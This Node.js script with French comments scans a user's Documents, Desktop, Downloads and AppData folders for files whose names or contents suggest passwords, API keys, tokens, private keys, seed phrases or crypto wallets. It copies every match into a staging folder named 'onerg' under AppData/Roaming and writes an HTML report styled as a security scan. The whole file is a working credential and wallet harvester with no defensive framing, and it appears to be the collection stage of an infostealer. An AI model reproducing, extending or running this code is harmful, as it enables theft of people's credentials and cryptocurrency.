const fs = require('fs');
const path = require('path');
const os = require('os');

// Définir le dossier de destination
const targetDir = path.join(os.homedir(), 'AppData', 'Roaming', 'onerg');

// Créer le dossier de destination s'il n'existe pas
if (!fs.existsSync(targetDir)) {
    fs.mkdirSync(targetDir, { recursive: true });
}

// Créer un dossier avec timestamp pour cette opération
const timestamp = Date.now();
const scanDir = path.join(targetDir, `scan_${timestamp}`);
fs.mkdirSync(scanDir, { recursive: true });

// Créer un log
const logFile = path.join(scanDir, 'scan_log.txt');
function log(message) {
    fs.appendFileSync(logFile, `${message}\n`);
    console.log(message);
}

log(`[+] Scan avancé démarré à ${new Date().toISOString()}`);
log(`[+] Les fichiers seront sauvegardés dans ${scanDir}`);

// Liste des patterns de fichiers sensibles à rechercher dans les noms de fichiers
const sensitiveFilePatterns = [
    // Fichiers de configuration
    '.env',
    'config',
    'settings',
    'credentials',
    
    // Fichiers de base de données
    '.db',
    '.sqlite',
    '.mdb',
    
    // Fichiers de mots de passe
    'password',
    'passwd',
    'motdepasse',
    'mdp',
    '.key',
    '.pem',
    '.pfx',
    '.p12',
    
    // Crypto
    'wallet',
    'crypto',
    'bitcoin',
    'ethereum',
    'seed',
    'ledger',
    'portefeuille',
    
    // Documents potentiellement sensibles
    'backup',
    'confidential',
    'private',
    'secret',
    'confidentiel',
    'privé',
    'personnel'
];

// Patterns à rechercher dans le contenu des fichiers
const sensitiveContentPatterns = [
    // Mots de passe
    'password:',
    'password=',
    'passwd:',
    'passwd=',
    'motdepasse:',
    'motdepasse=',
    'mdp:',
    'mdp=',
    'mot de passe',
    'mot_de_passe',
    
    // API keys et secrets
    'api_key',
    'apikey',
    'api-key',
    'secret_key',
    'secretkey',
    'secret-key',
    'token',
    'client_secret',
    'app_secret',
    
    // Crypto
    'wallet address',
    'private key',
    'adresse wallet',
    'clé privée',
    'seed phrase',
    'recovery phrase',
    'phrase de récupération',
    'seed words',
    'mnemonic',
    'mnémonique',
    
    // Connexions et accès
    'connexion',
    'identifiant',
    'login',
    'accès'
];

// Extensions de fichiers à analyser (pour la recherche de contenu)
const textFileExtensions = [
    '.txt', '.csv', '.json', '.xml', '.html', '.htm', '.js', '.ts', '.py', '.php', 
    '.md', '.cfg', '.config', '.ini', '.yaml', '.yml', '.rtf', '.log', '.conf'
];

// Dossiers à scanner
const foldersToScan = [
    path.join(os.homedir(), 'Documents'),
    path.join(os.homedir(), 'Desktop'),
    path.join(os.homedir(), 'Downloads'),
    path.join(os.homedir(), 'AppData', 'Local'),
    path.join(os.homedir(), 'AppData', 'Roaming')
];

// Limites de scan pour éviter de scanner tout le système
const MAX_DEPTH = 4;
const MAX_FILES = 2000;
const MAX_FILE_SIZE = 20 * 1024 * 1024; // 20MB
let filesScanned = 0;
let filesCopied = 0;

// Créer un tableau pour stocker les fichiers trouvés
let foundFiles = [];

// Ajouter des catégories pour les extensions
const fileCategories = {
    'Documents': ['.doc', '.docx', '.pdf', '.txt', '.rtf', '.odt'],
    'Images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff'],
    'Archives': ['.zip', '.rar', '.7z', '.tar', '.gz'],
    'Code': ['.js', '.py', '.java', '.cpp', '.cs', '.php', '.html', '.css'],
    'Configuration': ['.json', '.xml', '.yaml', '.yml', '.ini', '.config'],
    'Base de données': ['.db', '.sqlite', '.mdb', '.accdb'],
    'Crypto': ['.key', '.pem', '.pfx', '.p12', '.crt', '.cer'],
    'Autres': []
};

// Fonction pour déterminer la catégorie d'un fichier
function getFileCategory(filePath) {
    const ext = path.extname(filePath).toLowerCase();
    for (const [category, extensions] of Object.entries(fileCategories)) {
        if (extensions.includes(ext)) {
            return category;
        }
    }
    return 'Autres';
}

// Fonction pour vérifier le contenu d'un fichier texte
function checkFileContent(filePath) {
    try {
        // Vérifier l'extension
        const ext = path.extname(filePath).toLowerCase();
        if (!textFileExtensions.includes(ext)) return false;
        
        // Lire le contenu du fichier
        const content = fs.readFileSync(filePath, 'utf8');
        
        // Chercher les patterns sensibles
        return sensitiveContentPatterns.some(pattern => 
            content.toLowerCase().includes(pattern.toLowerCase())
        );
    } catch (err) {
        // En cas d'erreur (encodage non UTF-8, etc.), ignorer
        return false;
    }
}

// Fonction récursive pour scanner les dossiers
function scanDirectory(directory, depth = 0) {
    if (depth > MAX_DEPTH || filesScanned >= MAX_FILES) return;
    
    try {
        const items = fs.readdirSync(directory);
        
        for (const item of items) {
            if (filesScanned >= MAX_FILES) break;
            
            const fullPath = path.join(directory, item);
            
            try {
                const stats = fs.statSync(fullPath);
                
                if (stats.isDirectory()) {
                    // Filtrer certains dossiers systèmes
                    if (item === 'node_modules' || item === '.git' || item === 'Windows') {
                        continue;
                    }
                    // Scanner récursivement les sous-dossiers
                    scanDirectory(fullPath, depth + 1);
                } else if (stats.isFile() && stats.size < MAX_FILE_SIZE) {
                    filesScanned++;
                    
                    // 1. Vérifier si le nom de fichier correspond à un pattern sensible
                    const fileNameSensitive = sensitiveFilePatterns.some(pattern => 
                        item.toLowerCase().includes(pattern.toLowerCase())
                    );
                    
                    // 2. Vérifier le contenu du fichier (si c'est un fichier texte)
                    const contentSensitive = checkFileContent(fullPath);
                    
                    if (fileNameSensitive || contentSensitive) {
                        try {
                            // Copier le fichier dans le dossier cible
                            const relativePath = path.relative(os.homedir(), directory);
                            const targetPath = path.join(scanDir, relativePath);
                            
                            // Créer le dossier de destination si nécessaire
                            fs.mkdirSync(targetPath, { recursive: true });
                            
                            // Copier le fichier
                            const targetFile = path.join(targetPath, item);
                            fs.copyFileSync(fullPath, targetFile);
                            filesCopied++;
                            
                            const reason = fileNameSensitive ? "nom de fichier" : "contenu";
                            log(`[+] Fichier sensible (${reason}): ${fullPath} -> ${targetFile}`);
                            
                            // Ajouter le fichier à notre liste avec plus d'informations
                            foundFiles.push({
                                originalPath: fullPath,
                                copiedPath: targetFile,
                                reason: reason,
                                size: fs.statSync(fullPath).size,
                                timestamp: new Date().toISOString(),
                                category: getFileCategory(fullPath),
                                extension: path.extname(fullPath).toLowerCase(),
                                detectionType: fileNameSensitive ? 'pattern' : 'content'
                            });
                        } catch (err) {
                            log(`[!] Erreur lors de la copie de ${fullPath}: ${err.message}`);
                        }
                    }
                }
            } catch (err) {
                // Ignorer les erreurs de permission ou autres
                log(`[!] Erreur sur ${fullPath}: ${err.message}`);
            }
        }
    } catch (err) {
        log(`[!] Impossible de scanner ${directory}: ${err.message}`);
    }
}

// Démarrer le scan
foldersToScan.forEach(folder => {
    log(`[i] Scan du dossier: ${folder}`);
    scanDirectory(folder);
});

// Créer un rapport récapitulatif
const reportPath = path.join(scanDir, "rapport_scan.html");
const reportContent = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Rapport de scan de sécurité</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 20px;
            background-color: #f0f2f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        h1, h2 { 
            color: #1a1a1a;
            border-bottom: 2px solid #e0e0e0;
            padding-bottom: 10px;
        }
        .summary { 
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .warning { 
            color: #dc3545;
            background-color: #fff3f3;
            padding: 10px;
            border-radius: 4px;
            border-left: 4px solid #dc3545;
        }
        .files-list {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .file-item {
            padding: 10px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .file-item:hover {
            background-color: #f8f9fa;
        }
        .file-path {
            color: #2c3e50;
            font-family: monospace;
            word-break: break-all;
        }
        .file-info {
            color: #6c757d;
            font-size: 0.9em;
        }
        .file-reason {
            background-color: #e9ecef;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            color: #495057;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-item {
            background-color: #ffffff;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
        }
        .stat-value {
            font-size: 1.5em;
            font-weight: bold;
            color: #2c3e50;
        }
        .stat-label {
            color: #6c757d;
            font-size: 0.9em;
        }
        .timestamp {
            color: #6c757d;
            font-size: 0.9em;
            margin-top: 20px;
            text-align: center;
        }
        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        .file-card {
            background: white;
            border-radius: 8px;
            padding: 15px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .file-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .file-size {
            font-size: 0.9em;
            color: #666;
        }
        .file-details {
            font-size: 0.9em;
            color: #666;
            margin-top: 5px;
        }
        .file-path {
            word-break: break-all;
            font-family: monospace;
            font-size: 0.9em;
            margin: 5px 0;
        }
        .search-box {
            width: 100%;
            padding: 10px;
            margin: 20px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .file-count {
            margin: 20px 0;
            padding: 10px;
            background: #e9ecef;
            border-radius: 4px;
        }
        .filters {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 20px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
        }
        
        .filter-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .filter-group label {
            font-weight: 600;
            color: #495057;
            font-size: 0.9em;
        }
        
        .filter-group select,
        .filter-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dee2e6;
            border-radius: 6px;
            background-color: white;
            font-size: 0.95em;
        }
        
        .filter-group select:focus,
        .filter-group input:focus {
            outline: none;
            border-color: #80bdff;
            box-shadow: 0 0 0 0.2rem rgba(0,123,255,.25);
        }
        
        .file-card {
            position: relative;
            padding-top: 60px; /* Espace pour les badges */
        }
        
        .file-badges {
            position: absolute;
            top: 10px;
            left: 10px;
            right: 10px;
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .file-category,
        .file-detection {
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 0.8em;
            font-weight: 500;
            white-space: nowrap;
        }
        
        .file-category {
            background: #e9ecef;
            color: #495057;
        }
        
        .file-detection {
            background: #e9ecef;
        }
        
        .file-detection.pattern {
            background: #ffc107;
            color: #000;
        }
        
        .file-detection.content {
            background: #28a745;
            color: #fff;
        }
        
        .file-header {
            margin-top: 10px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 6px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .file-path {
            margin: 10px 0;
            padding: 8px;
            background: #f8f9fa;
            border-radius: 4px;
            font-family: monospace;
            font-size: 0.9em;
            word-break: break-all;
        }
        
        .file-details {
            margin-top: 10px;
            padding: 8px;
            background: #f8f9fa;
            border-radius: 4px;
            font-size: 0.9em;
            color: #6c757d;
        }
        
        .filter-tags {
            display: flex;
            gap: 8px;
            margin: 15px 0;
            flex-wrap: wrap;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 6px;
        }
        
        .filter-tag {
            padding: 6px 12px;
            background: #e9ecef;
            border-radius: 15px;
            font-size: 0.9em;
            cursor: pointer;
            user-select: none;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .filter-tag.active {
            background: #007bff;
            color: white;
        }
        
        .filter-tag:hover {
            opacity: 0.9;
        }
        
        .file-count {
            margin: 20px 0;
            padding: 15px;
            background: #e9ecef;
            border-radius: 6px;
            text-align: center;
            font-weight: 500;
            color: #495057;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Rapport de scan de sécurité</h1>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-value">${filesScanned}</div>
                <div class="stat-label">Fichiers analysés</div>
            </div>
            <div class="stat-item">
                <div class="stat-value">${foundFiles.length}</div>
                <div class="stat-label">Fichiers sensibles trouvés</div>
            </div>
            <div class="stat-item">
                <div class="stat-value">${foldersToScan.length}</div>
                <div class="stat-label">Dossiers analysés</div>
            </div>
        </div>

        <div class="summary">
            <h2>Informations générales</h2>
            <p><strong>Date du scan:</strong> ${new Date().toLocaleString()}</p>
            <p><strong>Dossiers analysés:</strong></p>
            <ul>
                ${foldersToScan.map(folder => `<li><code>${folder}</code></li>`).join('')}
            </ul>
            <p><strong>Dossier de sauvegarde:</strong> <code>${scanDir}</code></p>
        </div>

        <div class="warning">
            <strong>⚠️ ATTENTION:</strong> Ce rapport contient des informations sensibles. Assurez-vous de le traiter avec précaution.
        </div>

        <div class="files-list">
            <h2>Fichiers sensibles trouvés (${foundFiles.length})</h2>
            
            <div class="filters">
                <div class="filter-group">
                    <label>Recherche</label>
                    <input type="text" class="search-box" id="fileSearch" placeholder="Rechercher dans les fichiers..." onkeyup="filterFiles()">
                </div>
                
                <div class="filter-group">
                    <label>Catégorie</label>
                    <select id="categoryFilter" onchange="filterFiles()">
                        <option value="">Toutes les catégories</option>
                        ${Object.keys(fileCategories).map(cat => 
                            `<option value="${cat}">${cat}</option>`
                        ).join('')}
                    </select>
                </div>
                
                <div class="filter-group">
                    <label>Type de détection</label>
                    <select id="detectionFilter" onchange="filterFiles()">
                        <option value="">Tous les types</option>
                        <option value="pattern">Pattern dans le nom</option>
                        <option value="content">Pattern dans le contenu</option>
                    </select>
                </div>
            </div>

            <div class="filter-tags" id="activeFilters"></div>
            
            <div class="file-count">
                Affichage de ${foundFiles.length} fichiers sur ${foundFiles.length} trouvés
            </div>

            <div class="file-grid">
                ${foundFiles.map(file => `
                    <div class="file-card" 
                         data-category="${file.category}"
                         data-detection="${file.detectionType}"
                         data-extension="${file.extension}">
                        <div class="file-badges">
                            <div class="file-category">${file.category}</div>
                            <div class="file-detection ${file.detectionType}">
                                ${file.detectionType === 'pattern' ? 'Pattern' : 'Contenu'}
                            </div>
                        </div>
                        <div class="file-header">
                            <span class="file-reason">${file.reason}</span>
                            <span class="file-size">${(file.size / 1024).toFixed(2)} KB</span>
                        </div>
                        <div class="file-path">
                            <strong>Original:</strong><br>
                            ${file.originalPath}
                        </div>
                        <div class="file-path">
                            <strong>Copié vers:</strong><br>
                            ${file.copiedPath}
                        </div>
                        <div class="file-details">
                            Détecté le: ${new Date(file.timestamp).toLocaleString()}
                        </div>
                    </div>
                `).join('')}
            </div>
        </div>

        <div class="timestamp">
            Rapport généré le ${new Date().toLocaleString()}
        </div>
    </div>

    <script>
        function filterFiles() {
            const searchText = document.getElementById('fileSearch').value.toLowerCase();
            const categoryFilter = document.getElementById('categoryFilter').value;
            const detectionFilter = document.getElementById('detectionFilter').value;
            const fileCards = document.getElementsByClassName('file-card');
            let visibleCount = 0;
            
            // Mettre à jour les filtres actifs
            updateActiveFilters();

            for (let card of fileCards) {
                const text = card.textContent.toLowerCase();
                const category = card.dataset.category;
                const detection = card.dataset.detection;
                
                const matchesSearch = text.includes(searchText);
                const matchesCategory = !categoryFilter || category === categoryFilter;
                const matchesDetection = !detectionFilter || detection === detectionFilter;
                
                if (matchesSearch && matchesCategory && matchesDetection) {
                    card.style.display = '';
                    visibleCount++;
                } else {
                    card.style.display = 'none';
                }
            }

            document.querySelector('.file-count').textContent = 
                \`Affichage de \${visibleCount} fichiers sur \${${foundFiles.length}} trouvés\`;
        }
        
        function updateActiveFilters() {
            const activeFilters = document.getElementById('activeFilters');
            const categoryFilter = document.getElementById('categoryFilter').value;
            const detectionFilter = document.getElementById('detectionFilter').value;
            const searchText = document.getElementById('fileSearch').value;
            
            let html = '';
            
            if (categoryFilter) {
                html += \`<div class="filter-tag active" onclick="clearFilter('category')">Catégorie: \${categoryFilter} ×</div>\`;
            }
            if (detectionFilter) {
                html += \`<div class="filter-tag active" onclick="clearFilter('detection')">Type: \${detectionFilter} ×</div>\`;
            }
            if (searchText) {
                html += \`<div class="filter-tag active" onclick="clearFilter('search')">Recherche: "\${searchText}" ×</div>\`;
            }
            
            activeFilters.innerHTML = html;
        }
        
        function clearFilter(type) {
            switch(type) {
                case 'category':
                    document.getElementById('categoryFilter').value = '';
                    break;
                case 'detection':
                    document.getElementById('detectionFilter').value = '';
                    break;
                case 'search':
                    document.getElementById('fileSearch').value = '';
                    break;
            }
            filterFiles();
        }
    </script>
</body>
</html>
`;
fs.writeFileSync(reportPath, reportContent);

// Résumé
log(`\n[+] Scan terminé à ${new Date().toISOString()}`);
log(`[+] Fichiers scannés: ${filesScanned}`);
log(`[+] Fichiers sensibles copiés: ${filesCopied}`);
log(`[+] Les fichiers sensibles se trouvent dans: ${scanDir}`);
log(`[+] Rapport HTML créé: ${reportPath}`); 
